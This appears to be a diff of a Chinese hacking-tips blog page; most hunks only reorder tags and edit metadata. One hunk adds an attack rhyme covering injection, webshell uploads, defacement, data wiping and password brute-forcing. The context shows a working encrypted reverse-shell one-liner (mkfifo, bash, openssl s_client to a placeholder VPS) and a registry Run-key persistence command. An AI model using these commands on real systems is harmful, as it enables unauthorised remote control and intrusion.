@@ -9,7 +9,7 @@
   <title>个人渗透技巧汇总笔记 | 戏如烟云b16</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="description" content="部分工具转到云盘自取 前言首先我们拿到一个站不能心急，凡事三思而行 跑得太快是会滑倒的。网络安全方面可以看看我的另一篇防范技巧： 点此跳转网络靶场联系可以使用Vulstudy一键搭建12个靶场 当我们获得目标的时候不要急着用扫描器，这样会不仅会影响服务器的速度还会在对方的服务器日志生成大量的记录，什么站能扫什么站不能扫，心里一定要有点b数，不然可能等待的就是不一样的结果了。如果手工测试无果后再用代">
-<meta name="keywords" content="笔记,web技术,渗透测试">
+<meta name="keywords" content="web技术,笔记,渗透测试">
 <meta property="og:type" content="article">
 <meta property="og:title" content="个人渗透技巧汇总笔记">
 <meta property="og:url" content="http://yoursite.com/2020/08/06/个人渗透技巧汇总笔记/index.html">
@@ -28,7 +28,7 @@
 <meta property="og:image" content="https://z3.ax1x.com/2021/03/29/cCaOxI.png">
 <meta property="og:image" content="https://z3.ax1x.com/2021/03/29/cCaLRA.png">
 <meta property="og:image" content="https://z3.ax1x.com/2021/03/29/cCaqGd.png">
-<meta property="og:updated_time" content="2021-07-29T03:29:47.929Z">
+<meta property="og:updated_time" content="2021-12-21T02:46:33.951Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="个人渗透技巧汇总笔记">
 <meta name="twitter:description" content="部分工具转到云盘自取 前言首先我们拿到一个站不能心急，凡事三思而行 跑得太快是会滑倒的。网络安全方面可以看看我的另一篇防范技巧： 点此跳转网络靶场联系可以使用Vulstudy一键搭建12个靶场 当我们获得目标的时候不要急着用扫描器，这样会不仅会影响服务器的速度还会在对方的服务器日志生成大量的记录，什么站能扫什么站不能扫，心里一定要有点b数，不然可能等待的就是不一样的结果了。如果手工测试无果后再用代">
@@ -256,6 +256,8 @@ var _hmt = _hmt || [];
 <li>通过修改返回的状态值，触发js进行逻辑漏洞的渗透。</li>
 <li>token的key参数解密构建获取真实user密钥，可拼接、规律、时间戳……</li>
 </ol>
+<p>下面是网络上的渗透三字诀</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">进谷歌  找注入</span><br><span class="line">没注入  就旁注</span><br><span class="line">没旁注  用0day</span><br><span class="line">没0day  猜目录</span><br><span class="line">没目录  就嗅探</span><br><span class="line">爆账户  找后台</span><br><span class="line">传小马  放大马</span><br><span class="line">拿权限  挂页面</span><br><span class="line">放暗链  清数据</span><br><span class="line">渗透企业实战版</span><br><span class="line">搞企业  先扫描</span><br><span class="line">扫描器  商业好</span><br><span class="line">默密码  都知道</span><br><span class="line">社工库  找一找</span><br><span class="line">邮箱号  先列好</span><br><span class="line">九头蛇  跑一跑</span><br><span class="line">搞不定  放大招</span><br><span class="line">找插件  挖一挖</span><br><span class="line">发邮件  凭伪造</span><br><span class="line">没邮箱  搞网站</span><br><span class="line">二级域  皆可爆</span><br><span class="line">老漏洞  没修好</span><br><span class="line">新漏洞  刷一票</span><br><span class="line">干研发  Git 找</span><br><span class="line">源代码  全都要</span><br><span class="line">C D N  可以跳</span><br><span class="line">防火墙  可以撬</span><br><span class="line">堡垒机  可以秒</span><br><span class="line">云防护  可以秒</span><br><span class="line">是企业  没有哪家搞不了！</span><br></pre></td></tr></table></figure>
 <h4 id="二-fuzz的艺术"><a href="#二-fuzz的艺术" class="headerlink" title="二.fuzz的艺术"></a>二.fuzz的艺术</h4><p><a href="https://www.freebuf.com/vuls/221129.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/221129.html</a></p>
 <h4 id="三-Webbypass"><a href="#三-Webbypass" class="headerlink" title="三.Webbypass"></a>三.Webbypass</h4><p>linux反弹 shell：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1）VPS 上生成 ssl 证书的公钥/私钥对：</span><br><span class="line">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</span><br><span class="line">2）VPS 监听反弹 shell：</span><br><span class="line">openssl s_server -quiet -key key.pem -cert cert.pem -port 80</span><br><span class="line">3）目标上回连 shell：</span><br><span class="line">mkfifo /tmp/s; /bin/bash -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect &lt;your_vps&gt;:1024 &gt; /tmp/s; rm /tmp/s</span><br><span class="line"></span><br><span class="line">VPS 上已获取加密的 getshell 了。</span><br></pre></td></tr></table></figure></p>
 <p>winodws桌面：TeamViewerQS单文件</p>
@@ -313,11 +315,11 @@ reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v &quo
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">笔记</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">web技术</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">web技术</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">笔记</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
@@ -562,18 +564,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">笔记</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">linux</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">极客</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">资料</a>
               </li>
              
@@ -582,11 +572,23 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">笔记</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">linux</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">实用技术</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">工具</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">极客</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -614,11 +616,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">php</a>
+                <a href="javascript:void(0)" class="js-tag color3">娱乐</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">娱乐</a>
+                <a href="javascript:void(0)" class="js-tag color4">php</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -677,7 +679,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
     
     	<section class="tools-section tools-section-me" q-show="aboutme">
   	  	
-  	  		<div class="aboutme-wrap" id="js-aboutme">&lt;br&gt;俺是一个小学生业余喜欢在网上跟着做一些有趣的事情和diy一些电子设备，看看高效率的技术什么的。也喜欢去网上copy一些好玩实用的东西记录下来，以后万一就用上了呢哈哈。&lt;br&gt;最近在专研python自动化和一些常用的算法。&lt;br&gt;我是一个比较开朗的，心细，写代码也爱写备注的娃娃。&lt;br&gt; 不擅长与女娃娃交际。看着妹子就脸红 -_-|     &lt;br&gt;业余时间用hexo捣了一个博客，希望这些玩意能够在工作中帮到大家（文章中错别字可能有很多233- -\|）。</div>
+  	  		<div class="aboutme-wrap" id="js-aboutme">&lt;br&gt;俺是一个小学生业余喜欢在网上跟着做一些有趣的事情和diy一些电子设备，看看高效率的技术什么的。也喜欢去网上copy一些好玩实用的东西记录下来，主要是方便自己以后需要这些的时候回顾一下。&lt;br&gt;最近在专研python自动化和一些常用的算法。&lt;br&gt;我是一个比较开朗的，心细，写代码也爱写备注的娃娃。&lt;br&gt; 不擅长与女娃娃交际。看着妹子就脸红 -_-|     &lt;br&gt;业余时间用hexo捣了一个博客，希望这些玩意能够在工作中帮到大家（文章中错别字可能有很多233- -\|）。</div>
   	  	
     	</section>
     
